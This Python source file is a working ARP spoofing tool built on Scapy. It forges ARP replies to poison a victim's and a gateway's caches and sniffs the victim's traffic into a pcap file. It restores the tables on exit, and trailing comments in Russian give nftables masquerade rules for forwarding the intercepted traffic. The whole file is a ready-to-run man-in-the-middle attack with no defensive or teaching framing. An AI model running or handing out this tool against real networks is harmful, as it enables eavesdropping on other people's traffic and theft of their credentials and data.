from multiprocessing import Process, Event
from scapy.all import (ARP, Ether, wrpcap, conf, sendp, sniff, srp)
import sys
import time


def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=5, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    def __init__(self, victim, gateway, interface):
        self.victim = victim
        self.victimmac = get_mac(victim)

        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)

        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-' * 30)

        self.stop_flag = Event()

    def run(self):
        self.poison_proc = Process(target=self.poison)
        self.sniff_proc  = Process(target=self.sniff)

        self.poison_proc.start()
        self.sniff_proc.start()

        try:
            # main thread waits until sniff_proc finishes
            self.sniff_proc.join()
        except KeyboardInterrupt:
            print("Ctrl+C received, stopping...")

            # tell poison thread to exit
            self.stop_flag.set()

            # give some time
            time.sleep(1)

            # kill sniff forcibly (it blocks libpcap)
            self.sniff_proc.terminate()
            self.poison_proc.terminate()

            self.restore()
            print("ARP tables restored. Exiting.")
            sys.exit()

    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)

        print("Starting ARP poison...")

        while not self.stop_flag.is_set():
            sendp(Ether(dst=self.victimmac) / poison_victim, verbose=False)
            sendp(Ether(dst=self.gatewaymac) / poison_gateway, verbose=False)
            time.sleep(2)


    def sniff(self):
        bpf_filter = f"ip host {self.victim}"

        print("Sniffing started...")

        while not self.stop_flag.is_set():
            packet = sniff(count=1, filter=bpf_filter, iface=self.interface)
            wrpcap('arper.pcap', packet, append=True)



    def restore(self):
        print("Restoring ARP tables...")

        sendp(Ether(dst=self.victimmac) / ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst="ff:ff:ff:ff:ff:ff"
        ), count=5, verbose=False)

        sendp(Ether(dst=self.gatewaymac) / ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst="ff:ff:ff:ff:ff:ff"
        ), count=5, verbose=False)


if __name__ == '__main__':
    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    arper = Arper(victim, gateway, interface)
    arper.run()




# ---------------------------------------------------------------------------
# instructions
# добавить таблицу в /etc/nftables.conf

# table ip masq {
#     chain postrouting {
#         type nat hook postrouting priority srcnat; policy accept;

#         # Маскарадинг для внешнего интерфейса br0
#         oifname "br0" masquerade

#     }
# }

# применить измениния 
# nft -f /etc/nftables.conf
# ---------------------------------------------------------------------------




